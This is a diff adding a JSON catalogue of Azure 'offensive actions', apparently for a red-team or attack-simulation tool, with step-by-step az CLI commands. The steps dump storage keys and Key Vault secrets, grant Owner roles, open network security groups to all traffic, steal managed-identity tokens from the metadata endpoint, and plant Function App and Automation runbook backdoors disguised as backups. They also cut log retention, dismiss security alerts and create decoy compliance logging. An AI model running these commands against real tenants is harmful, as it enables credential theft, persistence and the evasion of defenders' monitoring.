@@ -1,0 +1,209 @@
+{
+    "offensive_actions": [
+        {
+            "id": "data_exfiltration",
+            "name": "Data Exfiltration",
+            "description": "Extract sensitive data from storage accounts and key vaults",
+            "required_permissions": [
+                "Microsoft.Storage/storageAccounts/*",
+                "Microsoft.KeyVault/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "List all storage accounts",
+                    "command": "az storage account list --query '[].{name:name,resourceGroup:resourceGroup}' --output table"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Get storage account keys",
+                    "command": "az storage account keys list --account-name TARGET_ACCOUNT --resource-group TARGET_RG"
+                },
+                {
+                    "stepNumber": 3,
+                    "description": "List key vaults",
+                    "command": "az keyvault list --query '[].{name:name,resourceGroup:resourceGroup}' --output table"
+                },
+                {
+                    "stepNumber": 4,
+                    "description": "Download secrets",
+                    "command": "az keyvault secret list --vault-name TARGET_VAULT"
+                }
+            ]
+        },
+        {
+            "id": "privilege_escalation",
+            "name": "Role Privilege Escalation",
+            "description": "Escalate privileges through role assignments",
+            "required_permissions": [
+                "Microsoft.Authorization/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "List current role assignments",
+                    "command": "az role assignment list --all --query \"[?principalName=='TARGET_USER']\" --output table"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Create Owner role assignment",
+                    "command": "az role assignment create --role \"Owner\" --assignee \"TARGET_USER\" --scope \"/subscriptions/TARGET_SUB\""
+                }
+            ]
+        },
+        {
+            "id": "nodify_nsg",
+            "name": "Modify NSG",
+            "description": "Modify NSG of compute resources and network",
+            "required_permissions": [
+                "Microsoft.Compute/*",
+                "Microsoft.Network/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "List all VMs",
+                    "command": "az vm list --query '[].{name:name,resourceGroup:resourceGroup}' --output table"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Create new VM",
+                    "command": "az vm create --name ATTACK_VM --resource-group TARGET_RG --image UbuntuLTS --admin-username azureuser --generate-ssh-keys"
+                },
+                {
+                    "stepNumber": 3,
+                    "description": "Modify NSG rules",
+                    "command": "az network nsg rule create --name AllowAll --nsg-name TARGET_NSG --resource-group TARGET_RG --priority 100 --access Allow --source-address-prefixes '*' --destination-port-ranges '*'"
+                }
+            ]
+        },
+        {
+            "id": "managed_identity_abuse",
+            "name": "Managed Identity Abuse",
+            "description": "Abuse managed identities for privilege escalation and lateral movement",
+            "required_permissions": [
+                "Microsoft.ManagedIdentity/*",
+                "Microsoft.Authorization/roleAssignments/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "List VMs with managed identities",
+                    "command": "az vm identity show --name <VM_NAME> --resource-group <RESOURCE_GROUP>"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Assign privileged role to managed identity",
+                    "command": "az role assignment create --assignee-object-id <MANAGED_IDENTITY_ID> --role \"Owner\" --scope /subscriptions/<SUBSCRIPTION_ID>"
+                },
+                {
+                    "stepNumber": 3,
+                    "description": "Access token theft from IMDS endpoint",
+                    "command": "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true"
+                }
+            ]
+        },
+        {
+            "id": "function_app_backdoor",
+            "name": "Function App Backdoor",
+            "description": "Create or modify Azure Functions for persistence",
+            "required_permissions": [
+                "Microsoft.Web/sites/*",
+                "Microsoft.Web/sites/functions/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "Create new function app",
+                    "command": "az functionapp create --name <APP_NAME> --storage-account <STORAGE_ACCOUNT> --resource-group <RESOURCE_GROUP> --consumption-plan-location eastus"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Deploy backdoor function",
+                    "command": "az functionapp deployment source config-zip -g <RESOURCE_GROUP> -n <APP_NAME> --src backdoor.zip"
+                },
+                {
+                    "stepNumber": 3,
+                    "description": "Configure function app authentication",
+                    "command": "az webapp auth update --name <APP_NAME> --resource-group <RESOURCE_GROUP> --enabled true --action AllowAnonymous"
+                }
+            ]
+        },
+        {
+            "id": "log_analytics_evasion",
+            "name": "Log Analytics Workspace Evasion",
+            "description": "Modify logging and monitoring settings to avoid detection",
+            "required_permissions": [
+                "Microsoft.OperationalInsights/workspaces/*",
+                "Microsoft.Security/alerts/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "List Log Analytics workspaces",
+                    "command": "az monitor log-analytics workspace list"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Modify retention settings",
+                    "command": "az monitor log-analytics workspace update --workspace-name <WORKSPACE_NAME> --resource-group <RESOURCE_GROUP> --retention-time 7"
+                },
+                {
+                    "stepNumber": 3,
+                    "description": "Disable security alerts",
+                    "command": "az security alert update --resource-group <RESOURCE_GROUP> --location <LOCATION> --alert-name <ALERT_NAME> --status Dismiss"
+                }
+            ]
+        },
+        {
+            "id": "automation_account_persistence",
+            "name": "Automation Account Persistence",
+            "description": "Create persistence using Azure Automation accounts",
+            "required_permissions": [
+                "Microsoft.Automation/automationAccounts/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "Create automation account with innocent name",
+                    "command": "az automation account create --name 'AzureBackupManager' --resource-group <RESOURCE_GROUP> --location eastus --sku Basic"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Import malicious runbook disguised as backup script",
+                    "command": "az automation runbook create --automation-account-name 'AzureBackupManager' --name 'Daily-Backup-Routine' --resource-group <RESOURCE_GROUP> --type PowerShell --content @backdoor.ps1"
+                },
+                {
+                    "stepNumber": 3,
+                    "description": "Create schedule that appears legitimate",
+                    "command": "az automation schedule create --automation-account-name 'AzureBackupManager' --name 'Nightly-Backup' --resource-group <RESOURCE_GROUP> --frequency Hour --interval 12 --start-time \"2025-01-01T02:00:00+00:00\""
+                }
+            ]
+        },
+        {
+            "id": "diagnostic_settings_manipulation",
+            "name": "Diagnostic Settings Manipulation",
+            "description": "Modify Azure diagnostic settings to avoid detection",
+            "required_permissions": [
+                "Microsoft.Insights/diagnosticSettings/*"
+            ],
+            "steps": [
+                {
+                    "stepNumber": 1,
+                    "description": "List current diagnostic settings",
+                    "command": "az monitor diagnostic-settings list --resource <RESOURCE_ID>"
+                },
+                {
+                    "stepNumber": 2,
+                    "description": "Modify settings to reduce logging",
+                    "command": "az monitor diagnostic-settings update --name 'security-logging' --resource <RESOURCE_ID> --logs '[{\"category\":\"Administrative\",\"enabled\":false},{\"category\":\"Security\",\"enabled\":false}]'"
+                },
+                {
+                    "stepNumber": 3,
+                    "description": "Create decoy settings to appear compliant",
+                    "command": "az monitor diagnostic-settings create --name 'compliance-logging' --resource <RESOURCE_ID> --workspace <WORKSPACE_ID> --logs '[{\"category\":\"Audit\",\"enabled\":true,\"retentionPolicy\":{\"days\":1,\"enabled\":true}}]'"
+                }
+            ]
+        }
+    ]
+}
